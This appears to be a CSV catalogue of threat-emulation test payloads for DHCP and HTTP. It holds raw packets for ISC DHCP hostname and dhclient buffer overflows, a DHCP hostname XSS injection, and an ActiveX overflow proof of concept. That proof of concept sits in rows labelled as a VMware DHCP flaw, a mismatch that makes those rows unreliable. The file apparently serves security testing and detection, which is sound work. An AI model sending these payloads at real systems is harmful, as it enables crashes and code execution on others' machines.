XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿DHCP_hostname.xml,DHCP Hostname Overflow,This threat sends a DHCP Discover packet with the hostname option set.  Causes a buffer overflow in certain versions of ISC DHCP server.,DHCP,UDP,[[01 01 06 00 08 b7 bf ]]4[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90 4b 4d ]]c[[fe 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]c[[82 ]]Sc5[[01 01 0c f0 ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[0c f0 ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[0c f0 ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[0c f0 ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[0c f0 ]]AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[[ff]]
﻿DHCP_hostname_alert.xml,DHCP Hostname XSS Injection,This threat sends a DHCP Discover packet with the hostname option set.  The hostname is set to a portion of Javascript that creates a pop-up window.  This technique can be used by a rogue host on the network to run Javascript with administrator privileges on the device serving the web page.,DHCP,UDP,[[01 01 06 00 08 b7 bf ]]4[[00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90 4b 4d ]]c[[fe 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]c[[82 ]]Sc5[[01 01 0c 1f 3c ]]script[[3e ]]a[[6c ]]ert('asdf')[[3b 3c 2f ]]script[[3e ff]]
﻿FSC20070919-22_EMC_VMware_Workstation_DHCP_Service_Integer_Underflow.xml,EMC VMware Workstation DHCP Service Integer Underflow,"There exists an integer underflow vulnerability in the way VMware DHCP service handles incoming messages. Specifically the vulnerability is due to lack of boundary check when processing DHCP requests. By sending specially crafted DHCP request, an unauthenticated remote attacker can leverage this flaw to execute arbitrary code on the target host with root or SYSTEM level privileges.",HTTP,TCP,"GET /~ndezhkam/poc.html HTTP/1.1[[0D 0A ]]Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*[[0D 0A ]]Accept-Language: en-us[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)[[0D 0A ]]Host: 172.16.1.2[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]"
FSC20070919-22_EMC_VMware_Workstation_DHCP_Service_Integer_Underflow.xml,EMC VMware Workstation DHCP Service Integer Underflow,"There exists an integer underflow vulnerability in the way VMware DHCP service handles incoming messages. Specifically the vulnerability is due to lack of boundary check when processing DHCP requests. By sending specially crafted DHCP request, an unauthenticated remote attacker can leverage this flaw to execute arbitrary code on the target host with root or SYSTEM level privileges.",HTTP,TCP,"[[00 00 00 00 00 00 ]]HTTP/1.1 200 OK[[0D 0A ]]Date: Fri, 21 Sep 2007 19:24:26 GMT[[0D 0A ]]Server: Apache/2.0.52 (CentOS) PHP/4.3.9 mod_python/3.1.3 Python/2.3.4 mod_perl/2.0.1 Perl/v5.8.5[[0D 0A ]]Last-Modified: Fri, 21 Sep 2007 19:18:13 GMT[[0D 0A ]]ETag: ""b0faf-142-21d06740""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 322[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<body>[[0D 0A ]]<br>Proof of Concept template<br> Copyright Assurent Secure Technologies, a Telus[[0D 0A ]] Company[[0D 0A ]]<br> All Rights Reserved <br>[[0D 0A ]]<script language=""javascript"">[[0D 0A ]]var b = '';[[0D 0A ]]var target = new ActiveXObject(""HpqUtil.System.1"");[[0D 0A ]]while (b.length <= 900) b+=""a"";[[0D 0A ]]target.ListFiles(b);[[0D 0A ]]</script>[[0D 0A ]]</body>[[0D 0A ]]</html>[[0D 0A]]"
﻿FSC20070919-22_EMC_VMware_Workstation_DHCP_Service_Integer_Underflow_IPv6.xml,EMC VMware Workstation DHCP Service Integer Underflow (IPv6 Version),"There exists an integer underflow vulnerability in the way VMware DHCP service handles incoming messages. Specifically the vulnerability is due to lack of boundary check when processing DHCP requests. By sending specially crafted DHCP request, an unauthenticated remote attacker can leverage this flaw to execute arbitrary code on the target host with root or SYSTEM level privileges. (IPv6 Version)",HTTP/IPv6,TCP,"GET /~ndezhkam/poc.html HTTP/1.1[[0D 0A ]]Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, */*[[0D 0A ]]Accept-Language: en-us[[0D 0A ]]Accept-Encoding: gzip, deflate[[0D 0A ]]User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)[[0D 0A ]]Host: 172.16.1.2[[0D 0A ]]Connection: Keep-Alive[[0D 0A 0D 0A]]"
FSC20070919-22_EMC_VMware_Workstation_DHCP_Service_Integer_Underflow_IPv6.xml,EMC VMware Workstation DHCP Service Integer Underflow (IPv6 Version),"There exists an integer underflow vulnerability in the way VMware DHCP service handles incoming messages. Specifically the vulnerability is due to lack of boundary check when processing DHCP requests. By sending specially crafted DHCP request, an unauthenticated remote attacker can leverage this flaw to execute arbitrary code on the target host with root or SYSTEM level privileges. (IPv6 Version)",HTTP/IPv6,TCP,"[[00 00 00 00 00 00 ]]HTTP/1.1 200 OK[[0D 0A ]]Date: Fri, 21 Sep 2007 19:24:26 GMT[[0D 0A ]]Server: Apache/2.0.52 (CentOS) PHP/4.3.9 mod_python/3.1.3 Python/2.3.4 mod_perl/2.0.1 Perl/v5.8.5[[0D 0A ]]Last-Modified: Fri, 21 Sep 2007 19:18:13 GMT[[0D 0A ]]ETag: ""b0faf-142-21d06740""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 322[[0D 0A ]]Keep-Alive: timeout=15, max=100[[0D 0A ]]Connection: Keep-Alive[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html>[[0D 0A ]]<body>[[0D 0A ]]<br>Proof of Concept template<br> Copyright Assurent Secure Technologies, a Telus[[0D 0A ]] Company[[0D 0A ]]<br> All Rights Reserved <br>[[0D 0A ]]<script language=""javascript"">[[0D 0A ]]var b = '';[[0D 0A ]]var target = new ActiveXObject(""HpqUtil.System.1"");[[0D 0A ]]while (b.length <= 900) b+=""a"";[[0D 0A ]]target.ListFiles(b);[[0D 0A ]]</script>[[0D 0A ]]</body>[[0D 0A ]]</html>[[0D 0A]]"
﻿FSC20090715-05_ISC_DHCP_dhclient_script_write_params_Stack_Buffer_Overflow.xml,ISC DHCP dhclient script_write_params Stack Buffer Overflow,"There exists a stack buffer overflow vulnerability in ISC DHCP dhclient. The vulnerability is due to a boundary error in parsing specially crafted subnet-mask option in DHCP responses sent from a server. Attackers in a network can exploit this vulnerability by running a malicious DHCP server, or by injecting malicious content in responses sent from an authentic server.            A successful attack targeting this vulnerability could allow remote attackers to inject and execute arbitrary code on the vulnerable system within the security context of the 'root' user.            In an attack case where code execution is not successful, the affected application will terminate abnormally.",DHCP,DHCP_ParamRequestListOption,[[FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20090715-05_ISC_DHCP_dhclient_script_write_params_Stack_Buffer_Overflow.xml,ISC DHCP dhclient script_write_params Stack Buffer Overflow,"There exists a stack buffer overflow vulnerability in ISC DHCP dhclient. The vulnerability is due to a boundary error in parsing specially crafted subnet-mask option in DHCP responses sent from a server. Attackers in a network can exploit this vulnerability by running a malicious DHCP server, or by injecting malicious content in responses sent from an authentic server.            A successful attack targeting this vulnerability could allow remote attackers to inject and execute arbitrary code on the vulnerable system within the security context of the 'root' user.            In an attack case where code execution is not successful, the affected application will terminate abnormally.",DHCP,UDP,[[02 01 06 00 9C 06 09 ]]h[[00 00 00 00 00 00 00 00 AC 10 08 ]]S[[00 00 00 00 00 00 00 00 00 0C ]])[[94 8D 9A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]c[[82 ]]Sc5[[01 05 01 ]]@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3[[04 00 00 00 ]]<[[FF]]
﻿FSC20090715-05_ISC_DHCP_dhclient_script_write_params_Stack_Buffer_Overflow_IPv6.xml,ISC DHCP dhclient script_write_params Stack Buffer Overflow (IPv6 Version),"There exists a stack buffer overflow vulnerability in ISC DHCP dhclient. The vulnerability is due to a boundary error in parsing specially crafted subnet-mask option in DHCP responses sent from a server. Attackers in a network can exploit this vulnerability by running a malicious DHCP server, or by injecting malicious content in responses sent from an authentic server.            A successful attack targeting this vulnerability could allow remote attackers to inject and execute arbitrary code on the vulnerable system within the security context of the 'root' user.            In an attack case where code execution is not successful, the affected application will terminate abnormally. (IPv6 Version)",DHCP/IPv6,DHCP_ParamRequestListOption,[[FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20090715-05_ISC_DHCP_dhclient_script_write_params_Stack_Buffer_Overflow_IPv6.xml,ISC DHCP dhclient script_write_params Stack Buffer Overflow (IPv6 Version),"There exists a stack buffer overflow vulnerability in ISC DHCP dhclient. The vulnerability is due to a boundary error in parsing specially crafted subnet-mask option in DHCP responses sent from a server. Attackers in a network can exploit this vulnerability by running a malicious DHCP server, or by injecting malicious content in responses sent from an authentic server.            A successful attack targeting this vulnerability could allow remote attackers to inject and execute arbitrary code on the vulnerable system within the security context of the 'root' user.            In an attack case where code execution is not successful, the affected application will terminate abnormally. (IPv6 Version)",DHCP/IPv6,UDP,[[02 01 06 00 9C 06 09 ]]h[[00 00 00 00 00 00 00 00 AC 10 08 ]]S[[00 00 00 00 00 00 00 00 00 0C ]])[[94 8D 9A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]c[[82 ]]Sc5[[01 05 01 ]]@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3[[04 00 00 00 ]]<[[FF]]
